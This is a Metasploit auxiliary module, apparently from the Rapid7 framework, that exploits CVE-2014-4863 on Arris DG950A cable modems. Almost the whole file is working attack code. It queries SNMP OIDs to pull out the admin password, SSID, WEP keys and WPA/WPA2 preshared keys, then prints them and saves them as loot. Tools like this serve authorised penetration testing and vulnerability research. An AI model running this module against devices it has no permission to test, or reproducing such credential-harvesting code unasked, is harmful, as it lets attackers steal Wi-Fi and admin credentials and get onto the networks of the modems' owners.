##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Arris DG950A Cable Modem Wifi Enumeration',
      'Description' => %q{
        This module will extract WEP keys and WPA preshared keys from
        Arris DG950A cable modems.
      },
      'References' => [
        ['CVE', '2014-4863'],
        ['URL', 'https://www.rapid7.com/blog/post/2014/08/21/more-snmp-information-leaks-cve-2014-4862-and-cve-2014-4863/']
      ],
      'Author' => ['Deral "Percent_X" Heiland'],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )
  end

  def run_host(ip)
    snmp = connect_snmp

    unless snmp.get_value('sysDescr.0') =~ /DG950A/
      fail_with(Failure::NoTarget, 'Does not appear to be an Arris DG950A')
    end

    print_line(ip.to_s)

    # System Admin Password
    wifi_info = ''
    password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')
    print_line("Password: #{password}")
    wifi_info << "Password: #{password}" << "\n"

    # check WPA Encryption Algorithm
    encrypt_type = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.1.12')
    case encrypt_type
    when 1
      wpa_encrypt = 'TKIP'
    when 2
      wpa_encrypt = 'AES'
    when 3
      wpa_encrypt = 'TKIP/AES'
    else
      wpa_encrypt = 'Unknown'
    end

    # Wifi Status
    wifi_status = snmp.get_value('1.3.6.1.2.1.2.2.1.8.12')
    if wifi_status == '1'
      ssid = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.22.1.2.12')
      print_line("SSID: #{ssid}")
      wifi_info << "SSID: #{ssid}" << "\n"

      # Wifi Security Settings
      wifi_version = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.22.1.5.12')
      if wifi_version == '0'
        print_line('Open Access Wifi is Enabled')
        wifi_info << 'Open Access WIFI is Enabled' << '\n'

      # WEP enabled
      elsif wifi_version == '1'
        wep_type = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.23.1.2.12')
        case wep_type
        when 1
          oid = '1.3.6.1.4.1.4115.1.20.1.1.3.24.1.2.12'
        when 2
          oid = '1.3.6.1.4.1.4115.1.20.1.1.3.25.1.2.12'
        else
          print_line('FAILED')
        end
        wepkey1 = snmp.get_value("#{oid}.1")
        key1 = wepkey1.to_s
        print_line("WEP KEY1: #{key1}")
        wifi_info << "WEP KEY1: #{key1}" << "\n"
        wepkey2 = snmp.get_value("#{oid}.2")
        key2 = wepkey2.to_s
        print_line("WEP KEY2: #{key2}")
        wifi_info << "WEP KEY2: #{key2}" << "\n"
        wepkey3 = snmp.get_value("#{oid}.3")
        key3 = wepkey3.to_s
        print_line("WEP KEY3: #{key3}")
        wifi_info << "WEP KEY3: #{key3}" << "\n"
        wepkey4 = snmp.get_value("#{oid}.4")
        key4 = wepkey4.to_s
        print_line("WEP KEY4: #{key4}")
        wifi_info << "WEP KEY4: #{key4}" << "\n"

      # WPA enabled
      elsif wifi_version == '2'
        wpapsk = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')
        print_line("WPA PSK: #{wpapsk}")
        print_line("WPA Encryption: #{wpa_encrypt}")
        wifi_info << "WPA PSK: #{wpapsk}" << "\n"
        wifi_info << "WPA Encryption #{wpa_encrypt}" << "\n"

      # WPA2 enabled
      elsif wifi_version == '3'
        wpapsk2 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')
        print_line("WPA2 PSK: #{wpapsk2}")
        print_line("WPA2 Encryption: #{wpa_encrypt}")
        wifi_info << "WPA2 PSK: #{wpapsk2}" << "\n"
        wifi_info << "WPA2 Encryption: #{wpa_encrypt}" << "\n"

      # WPA/WPA2 enabled
      elsif wifi_version == '7'
        wpawpa2psk = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')
        print_line("WPA/WPA2 PSK: #{wpawpa2psk}")
        print_line("WPA/WPA2 Encryption: #{wpa_encrypt}")
        wifi_info << "WPA/WPA2 PSK: #{wpawpa2psk}" << "\n"
        wifi_info << "WPA/WPA2 Encryption: #{wpa_encrypt}" << "\n"

      else
        print_line('FAILED')
      end
    else
      print_line('WiFi is not enabled')
    end

    # Woot we got loot.
    loot_name = 'arris_wifi'
    loot_type = 'text/plain'
    loot_filename = 'arris_wifi.text'
    loot_desc = 'Arris DG950A WiFi configuration data'
    p = store_loot(loot_name, loot_type, datastore['RHOST'], wifi_info, loot_filename, loot_desc)
    print_good("WiFi Data saved in: #{p}")
  rescue ::SNMP::UnsupportedVersion => e
    vprint_error(e.message)
  rescue ::SNMP::RequestTimeout
    raise $ERROR_INFO
  rescue StandardError => e
    print_error("#{ip} error: #{e.class} #{e.message}")
    disconnect_snmp
  end
end
